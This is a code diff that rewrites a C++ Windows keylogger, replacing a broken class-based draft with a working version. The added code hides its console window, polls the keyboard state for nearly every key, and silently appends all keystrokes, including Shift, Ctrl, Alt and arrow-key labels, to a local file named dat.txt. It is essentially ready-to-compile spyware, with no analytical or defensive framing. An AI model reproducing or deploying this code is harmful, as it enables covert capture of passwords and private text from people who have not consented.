@@ -1,91 +1,115 @@
-#include <windows.h>
+#define _WIN32_WINNT 0x0500
+#include <Windows.h>
+#include <string>
+#include <stdlib.h>
+#include <stdio.h>
 #include <iostream>
 #include <fstream>
-#include <stdio.h>
-#include <string>
-#include <sys/utsname.h>
-#include <stdlib.h>
+
+
+
 using namespace std;
-class Keylogger{
-public:
-	void WriteToFile(string file_name){
-		ofstream logkey; //Create object for file stream
-		logkey.open(file_name,fstream::app);
-		logkey << text; //Write text string to file
-		logkey.close();
+
+
+
+void LOG(string input) {
+	fstream LogFile;
+	LogFile.open("dat.txt", fstream::app);
+	if (LogFile.is_open()) {
+		LogFile << input;
+		LogFile.close();
 	}
-bool CheckListKey(int key){
-	string key;
-switch(key){
+}
+
+
+bool SpecialKeys(int S_Key) {
+	switch (S_Key) {
 	case VK_SPACE:
-	cout << " ";//Space key log 
-	this->WriteToFile(" ")
-	break;
-	case VK RETURN:
-	cout << "\n";//Enter key log
-	this->WriteToFile(" ")
-	break;
+		cout << " ";
+		LOG(" ");
+		return true;
+	case VK_RETURN:
+		cout << "\n";
+		LOG("\n");
+		return true;
+	case '¾':
+		cout << ".";
+		LOG(".");
+		return true;
 	case VK_SHIFT:
-	string shift = "<shiftkey>";
-	cout << shift;//Shift key log
-	this->WriteToFile(shift);
+		cout << "#SHIFT#";
+		LOG("#SHIFT#");
+		return true;
 	case VK_BACK:
-	cout << "\b";//Backspace key log
-	WriteToFile("\b");
-	break;
+		cout << "\b";
+		LOG("\b");
+		return true;
 	case VK_RBUTTON:
-	string rc = "<rclick>";
-	cout<<rc;//Emulates backspace.
-	WriteToFile(rc);
-	break;
-	case VK_LBUTTON:
-	string lb = "<lbutton>";//Mouse Click.
-	WriteToFile(lb);
-	break;
-default:
-return false;
-}
-}
-}
-class OS{
-public:
-void OsInfo(){
-	struct utsname osname;
-	if(uname(&osname)) exit(-1);
-	printf("Your PC's Operating system is %s@%s\n", osname.sysname, osname.release);
-	if(osname.sysname != "Windows"){
-		cout<<"This is a Windows-platform keylogger which uses a header <windows.h> that uses a Windows API."<<endl;
-		cout<<"All the common macros used by Windows programmers, and all the data types \nused by the various functions and subsystems are included in this header."<<endl;
-		Sleep(1);
-		cout<<"Exiting..."<<endl;
-		exit(1);
+		cout << "#R_CLICK#";
+		LOG("#R_CLICK#");
+		return true;
+	case VK_CAPITAL:
+		cout << "#CAPS_LOCK#";
+		LOG("#CAPS_LCOK");
+		return true;
+	case VK_TAB:
+		cout << "#TAB";
+		LOG("#TAB");
+		return true;
+	case VK_UP:
+		cout << "#UP";
+		LOG("#UP_ARROW_KEY");
+		return true;
+	case VK_DOWN:
+		cout << "#DOWN";
+		LOG("#DOWN_ARROW_KEY");
+		return true;
+	case VK_LEFT:
+		cout << "#LEFT";
+		LOG("#LEFT_ARROW_KEY");
+		return true;
+	case VK_RIGHT:
+		cout << "#RIGHT";
+		LOG("#RIGHT_ARROW_KEY");
+		return true;
+	case VK_CONTROL:
+		cout << "#CONTROL";
+		LOG("#CONTROL");
+		return true;
+	case VK_MENU:
+		cout << "#ALT";
+		LOG("#ALT");
+		return true;
+	default:
+		return false;
 	}
-	return 0;
 }
 
-}
 
-int main(){
-OS osys;
-OS *system = &osys;
-Keylogger keylog;
-Keylogger *keys = &keylog;
-system->osys;
-char key;
-string filename = "keylogs.txt";
-while(TRUE){
-	Sleep(10);
-	for(key = 8; key<=190;key++){
-		if(GetAsyncKeyState(key) == -32767){
-			if(keys->CheckListKey(key) == FALSE){
-				cout<<key;
-				ofstream file;
-				file.open(filename);
-				file << key;
-				file.close()
+
+int main()
+{
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	char KEY = 'x';
+
+	while (true) {
+		Sleep(10);
+		for (int KEY = 8; KEY <= 190; KEY++)
+		{
+			if (GetAsyncKeyState(KEY) == -32767) {
+				if (SpecialKeys(KEY) == false) {
+
+					fstream LogFile;
+					LogFile.open("dat.txt", fstream::app);
+					if (LogFile.is_open()) {
+						LogFile << char(KEY);
+						LogFile.close();
+					}
+
+				}
 			}
 		}
 	}
-}
-return 0;
+
+	return 0;
 }
